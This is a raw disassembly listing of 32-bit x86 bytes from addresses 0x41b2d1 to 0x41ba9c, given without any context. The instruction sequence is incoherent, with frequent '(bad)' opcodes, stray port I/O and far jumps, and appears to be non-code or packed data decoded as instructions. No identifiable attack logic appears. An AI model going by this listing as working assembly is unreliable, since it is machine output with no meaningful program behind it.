  41b2d1:	scas   eax,DWORD PTR es:[edi]
  41b2d2:	shl    DWORD PTR [edx+0xf979df],cl
  41b2d8:	ss popf 
  41b2da:	dec    ebp
  41b2db:	test   ebx,0x27f3d2a2
  41b2e1:	dec    ebx
  41b2e2:	mov    WORD PTR ds:0xd3ab2eb3,fs
  41b2e8:	out    0x24,eax
  41b2ea:	xor    BYTE PTR [ebx],ch
  41b2ec:	push   ss
  41b2ed:	jns    0x41b331
  41b2ef:	sub    al,0x42
  41b2f1:	iret   
  41b2f2:	fisub  DWORD PTR [edx+0x27]
  41b2f5:	mov    cl,BYTE PTR [ebx+0x17]
  41b2f8:	std    
  41b2f9:	push   esp
  41b2fa:	jl     0x41b34e
  41b2fc:	ds add edi,0x68a67fba
  41b303:	jns    0x41b310
  41b305:	aaa    
  41b306:	arpl   WORD PTR [ebx+0x35],si
  41b309:	std    
  41b30a:	fwait
  41b30b:	or     DWORD PTR [esi-0x10],ebp
  41b30e:	fs push eax
  41b310:	sar    dl,0xf4
  41b313:	inc    edi
  41b314:	pop    ebp
  41b315:	mov    al,0xd4
  41b317:	sub    BYTE PTR [ebp+esi*4+0x3a6054a2],ah
  41b31e:	in     eax,0x17
  41b320:	cmc    
  41b321:	addr16 gs pop ss
  41b324:	lds    edx,FWORD PTR [ebp+0x21695dbd]
  41b32a:	sub    BYTE PTR [ebx-0x64611e87],0x74
  41b331:	or     ebp,DWORD PTR [ecx-0x8ba33f6]
  41b337:	pop    edi
  41b338:	pop    eax
  41b339:	cs mov dh,bl
  41b33c:	xchg   esp,eax
  41b33d:	clc    
  41b33e:	jmp    0xe109953e
  41b343:	sub    al,BYTE PTR [edx-0x6f]
  41b346:	enter  0xba91,0x5
  41b34a:	test   DWORD PTR [ebx-0x4a],0x60bf3b5a
  41b351:	imul   ebx,ebp,0x149942a0
  41b357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b358:	jns    0x41b323
  41b35a:	outs   dx,DWORD PTR ds:[esi]
  41b35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b35c:	xlat   BYTE PTR ds:[ebx]
  41b35d:	sub    ch,BYTE PTR [esi]
  41b35f:	test   al,0xf5
  41b361:	shr    DWORD PTR [edx+0x8],cl
  41b364:	out    0x4d,eax
  41b366:	fld    DWORD PTR [esi-0x3e]
  41b369:	pop    esi
  41b36a:	in     eax,0x94
  41b36c:	cmp    BYTE PTR [edi-0x4d],cl
  41b36f:	call   0x9cf4673f
  41b374:	stos   BYTE PTR es:[edi],al
  41b375:	pop    es
  41b376:	sub    esi,DWORD PTR [ebp+0x49]
  41b379:	sahf   
  41b37a:	sar    DWORD PTR [ebp+0xe710f66],cl
  41b380:	nop
  41b381:	jnp    0x41b36b
  41b383:	shl    BYTE PTR [ebx-0x40a9ab6e],0xd6
  41b38a:	leave  
  41b38b:	mov    dh,0x39
  41b38d:	(bad)  
  41b38e:	popf   
  41b38f:	cmc    
  41b390:	mov    edi,esi
  41b392:	cmp    al,0x47
  41b394:	jo     0x41b3cf
  41b396:	fcom   QWORD PTR [eax]
  41b398:	retf   
  41b399:	scas   al,BYTE PTR es:[edi]
  41b39a:	sub    ah,0x58
  41b39d:	jno    0x41b322
  41b39f:	dec    edx
  41b3a0:	iret   
  41b3a1:	popf   
  41b3a2:	mov    ah,0x6d
  41b3a4:	aad    0xb8
  41b3a6:	imul   eax,DWORD PTR [edi-0x43f27b1b],0x76
  41b3ad:	xchg   ebp,eax
  41b3ae:	pop    eax
  41b3af:	inc    edx
  41b3b0:	mov    edx,0x9917f9d9
  41b3b5:	mov    dl,0x2a
  41b3b7:	cmp    ecx,ebp
  41b3b9:	pop    ss
  41b3ba:	adc    al,0xce
  41b3bc:	shl    BYTE PTR ds:[edx],0xc1
  41b3c0:	pshufw mm2,mm0,0x29
  41b3c4:	jae    0x41b370
  41b3c6:	mov    edx,0x12dbbc35
  41b3cb:	(bad)  
  41b3cc:	fild   WORD PTR [eax-0x1c281991]
  41b3d2:	outs   dx,DWORD PTR ds:[esi]
  41b3d3:	xor    BYTE PTR [ebx],0xe2
  41b3d6:	addr16 popa 
  41b3d8:	mov    dh,0x55
  41b3da:	xor    DWORD PTR [edi],ebx
  41b3dc:	(bad)  
  41b3dd:	in     eax,dx
  41b3de:	(bad)  
  41b3df:	sbb    DWORD PTR [esi-0xd8d3420],edi
  41b3e5:	(bad)
  41b3e9:	inc    esp
  41b3ea:	(bad)  
  41b3eb:	cdq    
  41b3ec:	add    ebp,DWORD PTR [ecx-0x6b]
  41b3ef:	ret    0x6da1
  41b3f2:	jns    0x41b441
  41b3f4:	(bad)  
  41b3f5:	(bad)  
  41b3f6:	je     0x41b44d
  41b3f8:	ror    BYTE PTR [esi+0x3b2886bf],0x16
  41b3ff:	or     al,0xab
  41b401:	in     eax,dx
  41b402:	sub    eax,DWORD PTR ds:0x6c2c26ee
  41b408:	mov    ah,0x13
  41b40a:	lds    ecx,FWORD PTR [ebp-0x6b]
  41b40d:	xor    BYTE PTR [edx],cl
  41b40f:	aam    0x75
  41b411:	fiadd  WORD PTR [eax]
  41b413:	mov    ds:0xb014135c,al
  41b418:	and    al,0x83
  41b41a:	ror    BYTE PTR [ecx-0x1a],0x40
  41b41e:	and    DWORD PTR [ebx+0xb],0xffffff82
  41b422:	mov    ah,0x77
  41b424:	pop    ss
  41b425:	or     esi,DWORD PTR [ebp-0x33e293cb]
  41b42b:	pop    ecx
  41b42c:	cmc    
  41b42d:	test   BYTE PTR cs:[esi+0x6939afd9],dl
  41b434:	sbb    bl,bl
  41b436:	mov    bh,0xf3
  41b438:	ins    DWORD PTR es:[edi],dx
  41b439:	mov    DWORD PTR [ecx-0x4103cb2e],ebp
  41b43f:	sub    DWORD PTR [ecx],edx
  41b441:	jae    0x41b459
  41b443:	mov    ds:0xc532e63b,eax
  41b448:	xchg   edx,eax
  41b449:	fsubr  DWORD PTR [ecx+0x68]
  41b44c:	pop    ebx
  41b44d:	cli    
  41b44e:	jmp    0x41b471
  41b450:	xor    al,0x1d
  41b452:	mov    dh,0x70
  41b454:	cmp    DWORD PTR [eax],ebp
  41b456:	pop    ss
  41b457:	ror    DWORD PTR [ebx-0x2b],cl
  41b45a:	rol    DWORD PTR [ecx+0x5dc03e27],0x0
  41b461:	fs ins DWORD PTR es:[edi],dx
  41b463:	sub    al,0xb1
  41b465:	rcr    BYTE PTR [eax+0x61],cl
  41b468:	mov    eax,0x4164419
  41b46d:	ret    0x1532
  41b470:	dec    ebx
  41b471:	loop   0x41b49d
  41b473:	or     dl,0xb6
  41b476:	in     al,0x95
  41b478:	dec    edi
  41b479:	add    al,0x25
  41b47b:	test   eax,0x87e8afd5
  41b480:	(bad)  
  41b481:	or     dl,cl
  41b483:	ret    0xc878
  41b486:	cs pop ds
  41b488:	and    BYTE PTR [eax],0xc9
  41b48b:	cdq    
  41b48c:	sbb    dh,ch
  41b48e:	pop    ecx
  41b48f:	mov    bh,0xc4
  41b491:	pop    edi
  41b492:	ror    BYTE PTR [eax],cl
  41b494:	xor    eax,0x0
	...
  41b511:	add    BYTE PTR [eax],al
  41b513:	add    BYTE PTR [ebp-0x7f],bl
  41b516:	sub    dl,0xde
  41b519:	jmp    0x41b598
  41b51b:	mov    bh,0xe6
  41b51d:	or     BYTE PTR [eax-0x2e],0xa8
  41b521:	push   ds
  41b522:	or     ah,BYTE PTR [ecx]
  41b524:	inc    ecx
  41b525:	push   ebx
  41b526:	add    DWORD PTR [eax],eax
  41b528:	imul   eax,DWORD PTR [edi],0xc5570000
  41b52e:	lock sti 
  41b530:	push   edi
  41b531:	dec    ebp
  41b532:	inc    ebp
  41b533:	dec    esp
  41b534:	out    dx,eax
  41b535:	push   ds
  41b536:	sub    ebp,DWORD PTR [ebx+edx*1-0x26]
  41b53a:	sbb    ecx,esp
  41b53c:	rcl    DWORD PTR [edi+0x1],0x8f
  41b540:	push   edx
  41b541:	aad    0x8f
  41b543:	stos   BYTE PTR es:[edi],al
  41b544:	xchg   edx,eax
  41b545:	das    
  41b546:	xchg   esp,eax
  41b547:	jns    0xc689535
  41b54d:	dec    ebp
  41b54e:	int    0x65
  41b550:	lds    edx,FWORD PTR [esi-0x10]
  41b553:	push   ebx
  41b554:	ror    BYTE PTR [ecx],cl
  41b556:	call   0x6ed4:0xac6a8845
  41b55d:	jns    0x41b513
  41b55f:	push   esp
  41b560:	ds xchg edi,eax
  41b562:	dec    ebp
  41b563:	out    0xe4,al
  41b565:	jmp    0x877db50e
  41b56a:	xchg   ecx,eax
  41b56b:	cwde   
  41b56c:	or     BYTE PTR [edi],cl
  41b56e:	stos   BYTE PTR es:[edi],al
  41b56f:	enter  0xc37b,0xd0
  41b573:	xchg   ebx,eax
  41b574:	mov    edi,0x83423172
  41b579:	repz rcl BYTE PTR [edi],1
  41b57c:	mov    eax,DWORD PTR [ebp+0x5fb31f1d]
  41b582:	xchg   ebx,eax
  41b583:	or     cl,bh
  41b585:	sbb    eax,0x2a9c72fe
  41b58a:	or     DWORD PTR [ebp+0x52],esi
  41b58d:	add    al,0x98
  41b58f:	add    bl,BYTE PTR [ecx+0x4fcb0092]
  41b595:	add    DWORD PTR [edx+ebp*4],ecx
  41b598:	or     BYTE PTR [ebx+0x60],dh
  41b59b:	xchg   DWORD PTR [eax-0x3a2c86d6],ebp
  41b5a1:	jnp    0x41b609
  41b5a3:	mov    BYTE PTR [esi-0x2f],ch
  41b5a6:	pop    ds
  41b5a7:	repnz inc edx
  41b5a9:	inc    edx
  41b5aa:	sub    DWORD PTR [edi],0x2
  41b5ad:	dec    edi
  41b5ae:	dec    eax
  41b5af:	gs push 0x153557f4
  41b5b5:	lods   al,BYTE PTR ds:[esi]
  41b5b6:	lahf   
  41b5b7:	jmp    0x449b60d7
  41b5bc:	call   0x74ba:0xf182ac1f
  41b5c3:	or     BYTE PTR [ebx],0x6e
  41b5c6:	aaa    
  41b5c7:	(bad)  
  41b5c8:	mov    edx,0xeccad05f
  41b5cd:	xchg   eax,esp
  41b5cf:	lahf   
  41b5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5d1:	sar    BYTE PTR [eax+ecx*8],cl
  41b5d4:	pusha  
  41b5d5:	mov    eax,ds:0xb63d0b0e
  41b5da:	call   0x2a738ab4
  41b5df:	mov    ch,0x5b
  41b5e1:	xor    ecx,DWORD PTR [edi]
  41b5e3:	mov    esp,0xd5d8b868
  41b5e8:	pop    eax
  41b5e9:	or     ah,BYTE PTR [ebx]
  41b5eb:	scas   eax,DWORD PTR es:[edi]
  41b5ec:	(bad)  
  41b5ed:	mov    ecx,0x6a5e54f9
  41b5f2:	inc    esp
  41b5f3:	(bad)  
  41b5f4:	pop    edi
  41b5f5:	cld    
  41b5f6:	test   BYTE PTR [edi-0x7dbbd241],0xb4
  41b5fd:	and    BYTE PTR [eax-0x14],al
  41b600:	and    DWORD PTR [eax+ebp*1],edx
  41b603:	mov    edx,ecx
  41b605:	rcr    BYTE PTR [ecx+0x63],1
  41b608:	outs   dx,BYTE PTR ds:[esi]
  41b609:	adc    DWORD PTR [esi],esp
  41b60b:	xchg   esp,eax
  41b60c:	(bad)  
  41b60d:	jecxz  0x41b601
  41b60f:	xor    ecx,DWORD PTR [edx+0x70]
  41b612:	or     ebx,DWORD PTR [edi-0x7e362c8b]
  41b618:	sbb    BYTE PTR ds:0xaff52520,ch
  41b61e:	cmp    BYTE PTR ds:0x13c738a1,al
  41b624:	nop
  41b625:	sub    edi,DWORD PTR [ebp+eax*4+0x6bce4a4e]
  41b62c:	stc    
  41b62d:	jo     0x41b618
  41b62f:	es iret 
  41b631:	test   al,0x73
  41b633:	push   ebx
  41b634:	(bad)  
  41b635:	shl    BYTE PTR [ecx+0x62],cl
  41b638:	call   DWORD PTR [edi+edi*8+0x9a39804]
  41b63f:	iret   
  41b640:	shl    BYTE PTR [esi+0x68772046],0x54
  41b647:	push   edi
  41b648:	inc    ebx
  41b649:	sbb    al,0xa2
  41b64c:	mov    dl,dh
  41b64e:	inc    edx
  41b64f:	dec    eax
  41b650:	je     0x41b610
  41b652:	test   ch,al
  41b654:	scas   al,BYTE PTR es:[edi]
  41b655:	sub    ch,BYTE PTR [edx+0x4813713f]
  41b65b:	aas    
  41b65c:	jae    0x41b6b7
  41b65e:	mov    al,bh
  41b660:	inc    ecx
  41b661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b662:	mov    cl,0x80
  41b664:	aam    0x37
  41b666:	(bad)  
  41b667:	(bad)  
  41b669:	xchg   esi,eax
  41b66a:	aad    0xf7
  41b66c:	std    
  41b66d:	sbb    eax,0xb043209a
  41b672:	pop    ecx
  41b673:	jo     0x41b65f
  41b675:	leave  
  41b676:	out    dx,al
  41b677:	mov    ebp,0xceaa0b3d
  41b67c:	sbb    DWORD PTR [eax-0x6710e78c],ebp
  41b682:	rcr    BYTE PTR [ebx],cl
  41b684:	jb     0x41b6e7
  41b686:	outs   dx,DWORD PTR ds:[esi]
  41b687:	les    esp,FWORD PTR [esi]
  41b689:	cdq    
  41b68a:	(bad)  
  41b68c:	push   0x22127c09
  41b691:	imul   ecx,ebp,0x96e75df1
  41b697:	ins    DWORD PTR es:[edi],dx
  41b698:	sbb    ebx,DWORD PTR [ebx]
  41b69a:	ss popf 
  41b69c:	adc    DWORD PTR [ebp+0x58a5236a],edi
  41b6a2:	ror    DWORD PTR [eax],cl
  41b6a4:	test   BYTE PTR [eax-0x6e],ah
  41b6a7:	fdiv   QWORD PTR [esi]
  41b6a9:	repz in eax,0x45
  41b6ac:	or     BYTE PTR [edx+eax*2-0x5629e5fa],0x2a
  41b6b4:	sub    al,0xaf
  41b6b6:	mov    edx,0x6c1b42ee
  41b6bb:	add    eax,0x7ef45b72
  41b6c0:	adc    DWORD PTR [ecx+ebx*1],esp
  41b6c3:	pop    esi
  41b6c4:	aam    0x45
  41b6c6:	aaa    
  41b6c7:	popa   
  41b6c8:	pop    esi
  41b6c9:	sub    BYTE PTR ss:[eax],dl
  41b6cc:	nop
  41b6cd:	rcr    edi,1
  41b6cf:	dec    esi
  41b6d0:	inc    ebp
  41b6d1:	repnz leave 
  41b6d3:	jl     0x41b73d
  41b6d5:	cli    
  41b6d6:	pushf  
  41b6d7:	jmp    0xc186:0x1379e8ad
  41b6de:	inc    ebx
  41b6df:	xchg   esp,eax
  41b6e0:	inc    edx
  41b6e1:	xchg   ecx,eax
  41b6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6e3:	jmp    0x3d70:0xa792a844
  41b6ea:	mov    esp,0xd6424149
  41b6ef:	dec    esi
  41b6f0:	mov    ds:0x82781af3,al
  41b6f5:	lahf   
  41b6f6:	sar    BYTE PTR [edi+0x7ea3ed75],cl
  41b6fc:	add    ah,BYTE PTR [esi]
  41b6fe:	adc    DWORD PTR [eax+eiz*4],ecx
  41b701:	(bad)  
  41b703:	mov    edi,0xc6c6144f
  41b708:	test   DWORD PTR [edx],ebp
  41b70a:	scas   al,BYTE PTR es:[edi]
  41b70b:	sub    BYTE PTR [esp+edx*2],ch
  41b70e:	retf   0xc9c6
  41b711:	mov    ds:0x5419bc59,al
  41b716:	shr    BYTE PTR [esi],1
  41b718:	fld    QWORD PTR [eax]
  41b71a:	fld    st(1)
  41b71c:	push   es
  41b71d:	arpl   WORD PTR [eax],bp
  41b71f:	outs   dx,BYTE PTR ds:[esi]
  41b720:	pop    ss
  41b721:	push   esi
  41b722:	pop    eax
  41b723:	mov    BYTE PTR [ecx],ch
  41b725:	xchg   ebx,eax
  41b726:	xchg   DWORD PTR [edx+0x38],eax
  41b729:	push   edi
  41b72a:	cmp    edx,ecx
  41b72c:	xchg   esi,eax
  41b72d:	scas   al,BYTE PTR es:[edi]
  41b72e:	sbb    ebp,esi
  41b730:	cmp    ebx,edi
  41b732:	mov    ecx,esp
  41b734:	ja     0x41b6d9
  41b736:	adc    al,0x9
  41b738:	(bad)  
  41b739:	pop    edx
  41b73a:	shr    esp,cl
  41b73c:	daa    
  41b73d:	data16 das 
  41b73f:	jne    0x41b717
  41b741:	cmp    cl,ah
  41b743:	in     al,0xe1
  41b745:	xchg   BYTE PTR [eax-0x41],bl
  41b748:	fidiv  WORD PTR [ebx]
  41b74a:	xchg   ebp,eax
  41b74b:	das    
  41b74c:	loope  0x41b72a
  41b74e:	loope  0x41b748
  41b750:	jns    0x41b73c
  41b752:	repnz mov db0,edi
  41b756:	int3   
  41b757:	popf   
  41b758:	add    bh,BYTE PTR [ebx]
  41b75a:	jno    0x41b71e
  41b75c:	push   ss
  41b75d:	fwait
  41b75e:	in     al,0x17
  41b760:	ror    edi,1
  41b762:	xor    al,0x57
  41b764:	ins    DWORD PTR es:[edi],dx
  41b765:	aaa    
  41b766:	sub    al,0x9a
  41b768:	pusha  
  41b769:	pop    ss
  41b76a:	ins    BYTE PTR es:[edi],dx
  41b76b:	xor    DWORD PTR [esi],edi
  41b76d:	mov    DWORD PTR [ebx+0x38],ecx
  41b770:	or     al,0x26
  41b772:	or     cl,BYTE PTR [edx+edx*8+0x0]
  41b776:	adc    BYTE PTR [esi+ebx*8],al
  41b779:	xchg   edi,eax
  41b77a:	push   es
  41b77b:	daa    
  41b77c:	inc    ecx
  41b77d:	adc    dh,0xef
  41b780:	mov    ebx,0xaf2e3a51
  41b785:	sahf   
  41b786:	pop    eax
  41b787:	inc    ebx
  41b788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b789:	dec    edi
  41b78a:	dec    edx
  41b78b:	mov    bh,0x4e
  41b78d:	jb     0x41b78f
  41b78f:	pop    es
  41b790:	sub    BYTE PTR gs:[ecx+ebx*8+0x75],bl
  41b795:	push   esp
  41b796:	fcomp  QWORD PTR [ebp-0x77]
  41b799:	push   es
  41b79a:	pop    ds
  41b79b:	(bad)  
  41b79c:	fistp  WORD PTR [esi+0x7e]
  41b79f:	adc    dl,BYTE PTR [edi]
  41b7a1:	mov    eax,ds:0xa3e06bc5
  41b7a6:	aam    0xf8
  41b7a8:	inc    esp
  41b7a9:	mov    ch,0xf3
  41b7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ac:	(bad)  
  41b7ad:	mov    dl,0xb0
  41b7af:	leave  
  41b7b0:	sahf   
  41b7b1:	inc    esp
  41b7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b3:	sub    bh,dl
  41b7b5:	hlt    
  41b7b6:	enter  0xbcee,0xe5
  41b7ba:	pop    edx
  41b7bb:	push   edi
  41b7bc:	in     eax,dx
  41b7bd:	mov    edx,0xc6175e52
  41b7c2:	jae    0x41b83e
  41b7c4:	je     0x41b820
  41b7c6:	push   cs
  41b7c7:	mov    al,0x5d
  41b7c9:	inc    ebp
  41b7ca:	into   
  41b7cb:	mov    dl,0xa9
  41b7cd:	mov    al,0xbd
  41b7cf:	jne    0x41b841
  41b7d1:	jns    0x41b770
  41b7d3:	adc    eax,0x958939ad
  41b7d8:	in     eax,dx
  41b7d9:	jb     0x41b825
  41b7db:	sub    eax,0x930af1c0
  41b7e0:	imul   ebp,DWORD PTR [edx-0x52],0x41
  41b7e4:	push   ds
  41b7e5:	push   ebx
  41b7e6:	test   al,0x7b
  41b7e8:	mov    al,0x52
  41b7ea:	int    0xdf
  41b7ec:	push   ds
  41b7ed:	jmp    0x41b826
  41b7ef:	adc    BYTE PTR [ecx-0x4f],cl
  41b7f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7f3:	in     al,0x94
  41b7f5:	jb     0x41b82a
  41b7f7:	cmp    edi,ebx
  41b7f9:	jl     0x41b86d
  41b7fb:	in     al,0xbb
  41b7fd:	and    al,ch
  41b7ff:	mov    edi,0xe7544e07
  41b804:	scas   eax,DWORD PTR es:[edi]
  41b805:	mov    ebx,0xf282cf71
  41b80a:	(bad)  
  41b80b:	in     eax,dx
  41b80c:	mov    ds:0x414f668d,al
  41b811:	adc    eax,0xe7646b2f
  41b816:	push   esi
  41b817:	fs cld 
  41b819:	in     eax,0x9e
  41b81b:	sbb    DWORD PTR [ebx+0xb],edi
  41b81e:	jecxz  0x41b881
  41b820:	cs jmp 0x7a4c:0x468ae41c
  41b828:	add    DWORD PTR ds:0xd521ce2f,0x1fc7c81e
  41b832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b833:	imul   edi,DWORD PTR [edi+0x51],0xd0ab0c4
  41b83a:	push   ebx
  41b83b:	pop    ss
  41b83c:	leave  
  41b83d:	lds    ebx,FWORD PTR [edi+0x8]
  41b840:	das    
  41b841:	wbinvd 
  41b843:	in     eax,dx
  41b844:	int    0x8d
  41b846:	sub    eax,0xdd6c72cd
  41b84b:	dec    eax
  41b84c:	sub    ch,BYTE PTR [eax-0x45]
  41b84f:	pushf  
  41b850:	mov    esp,0x93a42ac1
  41b855:	test   DWORD PTR [ebx+edi*1+0x56],0xe1cbb2ef
  41b85d:	or     BYTE PTR [ecx+0x60ad725f],ch
  41b863:	inc    edx
  41b864:	sbb    al,0x51
  41b866:	cmc    
  41b867:	mov    cl,0xb6
  41b869:	fldenv [ebx+ebx*4-0x6d]
  41b86d:	push   ds
  41b86e:	cmp    BYTE PTR [edi+ecx*1],cl
  41b871:	in     al,0x76
  41b873:	(bad)  
  41b874:	mov    al,ss:0xf97e95ac
  41b87a:	mov    al,0x4a
  41b87c:	push   edi
  41b87d:	stos   DWORD PTR es:[edi],eax
  41b87e:	cmp    DWORD PTR [ebp-0x701cac1f],edx
  41b884:	les    edx,FWORD PTR [esi+eax*2-0x4caa3f9d]
  41b88b:	push   esp
  41b88c:	test   al,0x4a
  41b88e:	pop    ss
  41b88f:	addr16 cmp eax,0xef96bc42
  41b895:	mov    bl,0xf2
  41b897:	fsubr  QWORD PTR ds:[ebx-0x7ae5beff]
  41b89e:	mov    eax,ds:0x7d8ed2c5
  41b8a3:	xchg   edi,eax
  41b8a4:	inc    ecx
  41b8a5:	loope  0x41b8bf
  41b8a7:	rcl    DWORD PTR ds:0x84fd3f84,1
  41b8ad:	and    al,0x79
  41b8af:	sub    BYTE PTR [esi+0x67722e44],cl
  41b8b5:	mov    eax,ds:0x71049e20
  41b8ba:	xchg   ebx,eax
  41b8bb:	jp     0x41b8c2
  41b8bd:	mov    eax,ds:0x14482d70
  41b8c2:	push   edx
  41b8c3:	push   ebp
  41b8c4:	sub    BYTE PTR [ecx],al
  41b8c6:	mov    dh,0x7
  41b8c8:	xor    dh,BYTE PTR [ebx]
  41b8ca:	call   0x3c4f:0x4191b2ae
  41b8d1:	retf   
  41b8d2:	sbb    DWORD PTR [eax+0x3483828a],ebx
  41b8d8:	sbb    BYTE PTR [esi+0x365660f7],ah
  41b8de:	cmp    esi,DWORD PTR [edi+0x32]
  41b8e1:	imul   ecx,DWORD PTR [eax+0x2428f703],0x17
  41b8e8:	iret   
  41b8e9:	pop    edi
  41b8ea:	mov    bl,0xf9
  41b8ec:	fist   DWORD PTR [edi-0xa]
  41b8ef:	stos   BYTE PTR es:[edi],al
  41b8f0:	in     eax,dx
  41b8f1:	in     eax,dx
  41b8f2:	jo     0x41b885
  41b8f4:	cdq    
  41b8f5:	xlat   BYTE PTR ds:[ebx]
  41b8f6:	xchg   esp,eax
  41b8f7:	gs pop ecx
  41b8f9:	es xor edi,ebp
  41b8fc:	jge    0x41b935
  41b8fe:	push   ds
  41b8ff:	out    dx,al
  41b900:	jno    0x41b95d
  41b902:	or     BYTE PTR [ebx+0x6b],bh
  41b905:	es dec eax
  41b907:	xor    bl,dh
  41b909:	in     al,dx
  41b90a:	xor    BYTE PTR [eax+0x4e5b86be],ch
  41b910:	call   0xfb30abb6
  41b915:	mov    dl,0x1
  41b917:	sub    esi,DWORD PTR [ebp+0x1680ce20]
  41b91d:	pop    ds
  41b91e:	cmp    ebx,DWORD PTR [ebx+eax*4-0x70]
  41b922:	popa   
  41b923:	daa    
  41b924:	loop   0x41b8cf
  41b926:	enter  0xd5e6,0x9a
  41b92a:	jle    0x41b990
  41b92c:	add    ch,bh
  41b92e:	int3   
  41b92f:	cwde   
  41b930:	jne    0x41b938
  41b932:	bound  ecx,QWORD PTR [ebx+0x66]
  41b935:	pop    esp
  41b936:	or     DWORD PTR [esp+ebp*1],ebp
  41b939:	mov    ds:0xd67e77f6,eax
  41b93e:	cmp    cl,BYTE PTR [eax-0x40]
  41b941:	psubusw mm2,mm7
  41b944:	mov    bh,0x17
  41b946:	enter  0xa709,0xdc
  41b94a:	call   0x814c:0x54fbdd0f
  41b951:	std    
  41b952:	and    eax,0xeb305b0c
  41b957:	pop    esi
  41b958:	fs and al,0xc2
  41b95b:	sbb    DWORD PTR [edx],0xffffffc4
  41b95e:	sbb    BYTE PTR [ebp+0x85ca5f],ch
  41b964:	aam    0x34
  41b966:	shl    al,1
  41b968:	jo     0x41b947
  41b96a:	icebp  
  41b96b:	mov    eax,0xfcbda23
  41b970:	cmp    al,0x11
  41b972:	and    cl,al
  41b974:	add    ebp,DWORD PTR [esi-0x1a62071]
  41b97a:	(bad)
  41b97e:	jno    0x41b947
  41b980:	jp     0x41b91c
  41b982:	data16 aas 
  41b984:	aas    
  41b985:	jnp    0x41b941
  41b987:	mov    al,ds:0xb15e868d
  41b98c:	jmp    0x41b9ea
  41b98e:	push   ebx
  41b98f:	mov    WORD PTR [edx],es
  41b991:	push   esi
  41b992:	mov    ch,0x88
  41b994:	popf   
  41b995:	(bad)  
  41b996:	mov    ah,0xb1
  41b998:	inc    edx
  41b999:	mov    ds:0x59873b9b,eax
  41b99e:	in     eax,dx
  41b99f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b9a1:	les    edx,FWORD PTR [esi]
  41b9a3:	fidivr DWORD PTR [edx+edi*8+0x25f0592c]
  41b9aa:	or     eax,0x73c3a67b
  41b9af:	enter  0x83d8,0x81
  41b9b3:	je     0x41b9e6
  41b9b5:	pop    edx
  41b9b6:	imul   ebx,ebx,0xa823fde8
  41b9bc:	mov    ds:0xac3dc105,eax
  41b9c1:	mov    BYTE PTR [eax],ch
  41b9c3:	sub    ecx,esi
  41b9c5:	pop    eax
  41b9c6:	sub    DWORD PTR [edi],esi
  41b9c8:	xchg   ebx,eax
  41b9c9:	push   ecx
  41b9ca:	pop    ecx
  41b9cb:	and    al,0x1a
  41b9cd:	das    
  41b9ce:	add    esi,DWORD PTR [esi]
  41b9d0:	mov    dh,0xdd
  41b9d2:	lods   al,BYTE PTR ds:[esi]
  41b9d3:	pop    esi
  41b9d4:	int3   
  41b9d5:	or     BYTE PTR [edx+0x6b47b1e1],0x28
  41b9dc:	popf   
  41b9dd:	or     al,0x6c
  41b9df:	stc    
  41b9e0:	sub    eax,DWORD PTR [ecx]
  41b9e2:	mov    esi,0xce6087a1
  41b9e7:	scas   eax,DWORD PTR es:[edi]
  41b9e8:	add    al,0x8c
  41b9ea:	rcl    DWORD PTR [esp+edx*1+0x59],1
  41b9ee:	mov    esp,0x545e31fb
  41b9f3:	lods   al,BYTE PTR ds:[esi]
  41b9f4:	call   0x9cc7:0x5ede95d5
  41b9fb:	fdivrp st(6),st
  41b9fd:	sbb    eax,0xd5acbb43
  41ba02:	xchg   cl,bh
  41ba04:	mov    al,0x49
  41ba06:	push   ebx
  41ba07:	adc    BYTE PTR ds:0x7154f1a3,dl
  41ba0d:	(bad)  
  41ba0e:	xor    ch,ch
  41ba10:	ss pop ebp
  41ba12:	jo     0x41ba3d
  41ba14:	sub    bl,ah
  41ba16:	test   al,0x89
  41ba18:	sahf   
  41ba19:	pop    esp
  41ba1a:	leave  
  41ba1b:	inc    eax
  41ba1c:	or     BYTE PTR gs:[ebx+0x1221c206],al
  41ba23:	js     0x41ba84
  41ba25:	jne    0x41ba37
  41ba27:	popa   
  41ba28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba29:	add    al,dl
  41ba2b:	inc    esp
  41ba2c:	inc    eax
  41ba2d:	add    ah,BYTE PTR [ebx-0x74]
  41ba30:	jb     0x41b9b3
  41ba32:	ret    0x6a2a
  41ba35:	or     DWORD PTR [edx+0x5c],ebx
  41ba38:	sbb    DWORD PTR [esp+ebp*8+0x56],ebp
  41ba3c:	icebp  
  41ba3d:	and    dh,BYTE PTR [ecx-0x73030588]
  41ba43:	repz (bad) 
  41ba45:	lock icebp 
  41ba47:	push   ecx
  41ba48:	(bad)  
  41ba49:	fadd   DWORD PTR [edi+ecx*8+0x6b]
  41ba4d:	inc    eax
  41ba4e:	xor    BYTE PTR [ebx+ebx*8+0x25],ch
  41ba52:	add    al,0x78
  41ba54:	int    0xd9
  41ba56:	xchg   edi,eax
  41ba57:	inc    edx
  41ba58:	fwait
  41ba59:	mov    dl,0x9e
  41ba5b:	cld    
  41ba5c:	sar    BYTE PTR [edx],1
  41ba5e:	cmp    dl,BYTE PTR [ebx]
  41ba60:	mov    eax,0xe10d1be8
  41ba65:	lods   eax,DWORD PTR ds:[esi]
  41ba66:	add    al,0xc1
  41ba68:	mov    al,ds:0x7b54fbf9
  41ba6d:	push   es
  41ba6e:	es xchg ebp,eax
  41ba70:	clc    
  41ba71:	js     0x41baad
  41ba73:	add    eax,0xf8ddd743
  41ba78:	sbb    DWORD PTR ds:0x49aaeede,0xacf151cf
  41ba82:	xchg   ebx,eax
  41ba83:	pop    ecx
  41ba84:	aas    
  41ba85:	lock adc esi,DWORD PTR [eax+edi*1-0x19f403bd]
  41ba8d:	popa   
  41ba8e:	mov    edx,0x8b952d19
  41ba93:	pop    ecx
  41ba94:	mov    esp,0x9f5441e8
  41ba99:	jae    0x41baa1
  41ba9b:	xchg   ebx,eax
  41ba9c:	or     DWORD PTR [ecx],esp
